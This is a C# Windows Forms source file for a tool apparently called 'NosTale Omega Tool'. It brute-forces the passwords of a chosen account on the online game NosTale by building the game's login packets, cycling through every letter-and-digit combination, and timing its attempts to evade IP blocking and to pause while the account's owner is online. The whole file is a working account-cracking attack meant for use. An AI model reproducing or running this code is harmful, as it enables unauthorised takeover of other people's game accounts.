using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

using MaterialSkin;
using MaterialSkin.Controls;
using System.Runtime.InteropServices;
using System.Net;
using System.Threading;

namespace NosTale_Omega_Tool
{
    public partial class MainUI : MaterialForm
    {
        public MainUI()
  {
      InitializeComponent();
            
      var materialSkinManager = MaterialSkinManager.Instance;
      materialSkinManager.AddFormToManage(this);
      materialSkinManager.Theme = MaterialSkinManager.Themes.DARK;
     materialSkinManager.ColorScheme = new ColorScheme(Primary.BlueGrey800, Primary.BlueGrey900, Primary.BlueGrey500, Accent.LightBlue200, TextShade.WHITE);
        }
        int counter = 0;
        public delegate bool BruteForceTest(ref char[] test, int testIndex, int testMax);
        static int Begin;
        // fast, compact, non-recursive, brute force algorithm
        public static bool BruteForce(string testLetters, int testLength, BruteForceTest testCallback)
        {
            // get the number of combinations we need to try (just for statistic purposes)
            int testIndex = 0, testMax = (int)Math.Pow(testLetters.Length, testLength);

            // initialize & perform first test
            var test = new char[testLength];
            for (int x = 0; x < testLength; x++)
                test[x] = testLetters[0];
            if (testCallback(ref test, ++testIndex, testMax))
                return true;

            // start rotating chars from the back and forward
            for (int ti = testLength - 1, li = 0; ti > -1; ti--)
            {
                for (li = testLetters.IndexOf(test[ti]) + 1; li < testLetters.Length; li++)
                {
                    // test
                    test[ti] = testLetters[li];
                    if (testCallback(ref test, ++testIndex, testMax))
                        
                        return true;

                    // rotate to the right
                    for (int z = ti + 1; z < testLength; z++)
                        if (test[z] != testLetters[testLetters.Length - 1])
                        {
                            ti = testLength;
                            goto outerBreak;
                        }
                }
                outerBreak:
                if (li == testLetters.Length)
                    test[ti] = testLetters[0];
            }
            
            // no match
            return false;
        }

        public static string chr(int number)
        {
            return ((char)number).ToString();
        }
        #region MOVE FORM IMPORTS
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        #endregion

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void materialTabSelector1_Click(object sender, EventArgs e)
        {
            
        }

        private void materialFlatButton1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void materialFlatButton2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
      private void CheckPassword(string username, int x, int y)
        {
             string dictionnaire = "abcdefghijklmnopqrstuvwxyz0123456789";

            var str = "";

            WebClient webc = new WebClient();
            string HASHID = "";
            HASHID = webc.DownloadString("http://localhost:8081/hi/hashid_encoding.php?ID=" + username);
            BruteForceTest testCallback = delegate (ref char[] test, int testIndex, int testMax) {
                Thread.Sleep(500);
                counter++;
                if (counter % 5 == 0)
                {
                    Thread.Sleep(5000);
                   // counter = 0;
                    
                }
                Back:
                str = new string(test);
                bool isOnline = false;
                Wr(DateTime.Now + " -> " + str + "\t" + Math.Round(100 * (testIndex / (double)testMax), 0) + "%");

                string password = str;
                password = webc.DownloadString("http://localhost:8081/hi/password_encoding.php?pw=" + password);
                string packet = "NoS0575 3780918 " + username + " " + password + " 000C0B3A" +
                       chr(11) + "0.9.3.3055 0 " + HASHID;

                string encrypted_packet = webc.DownloadString("http://localhost:8081/hi/cryptography.php?method=encrypt&packet=" + packet);
                string decrypted_response = webc.DownloadString("http://localhost:8081/hi/cryptography.php?method=decrypt&packet=" + packet);
                if (decrypted_response.Contains("Could not connect to server"))
                {
                    Wr("Could not connect to server. Your IP must have been blocked by NosTale.");
                    goto Back;
                }

                string[] decrypted_response_array = decrypted_response.Split(' ');
                while (decrypted_response_array[2] == "ID")
                {
                    if (isOnline == false)
                    {
                        Wr("Compte connecté, pause du bruteforcing...");
                    }
                    isOnline = true;
                    //  Wr("Cet id est déjà utilisé. Annulation de l'opération Starfoulah");
                    encrypted_packet = webc.DownloadString("http://localhost:8081/hi/cryptography.php?method=encrypt&packet=" + packet);
                    decrypted_response = webc.DownloadString("http://localhost:8081/hi/cryptography.php?method=decrypt&packet=" + packet);
                    decrypted_response_array = decrypted_response.Split(' ');
                   
                }

                if (isOnline)
                {
                    Wr("Compte deconnecté... Le travail continue...");
                }
                //Wr(decrypted_response);

                return (decrypted_response_array[0] == "NsTeST");

            };
            // test all combinations of the letters "abc" with the result length 3
            // todo: you may want to add a for-loop here to test e.g. length 1 to 8
            for (int i = x; i < y; i++)
            {
                if (BruteForce(dictionnaire, i, testCallback))
                {
                    Wr("=> Success! Password: " + str + " Trouvé en : " + Convert.ToInt32(System.Environment.TickCount - Begin));

                    Console.Beep();
                    break;
                }
                else {
                    Wr("=> Failure! Combination not found!");
                }
            }

        }
        private void materialFlatButton3_Click(object sender, EventArgs e)
        {
            Wr("Starting Bruteforcing...");
            Wr("Testing accounts...");

            Thread myThread = new Thread(new ThreadStart(BruteForce1));
            myThread.Start();
        }
      
        private void Wr(string text)
        {
            TextBox.CheckForIllegalCrossThreadCalls = false;
            textBox1.AppendText("=> " + text);
            textBox1.AppendText(Environment.NewLine);
          
        }
    
        private void BruteForce1()
        {
            string username = materialSingleLineTextField1.Text;
            int x = Convert.ToInt32(materialSingleLineTextField3.Text);
            int y = Convert.ToInt32(materialSingleLineTextField4.Text);
            CheckPassword(username, x, y);
            Begin = System.Environment.TickCount;
           
        }
    }
}
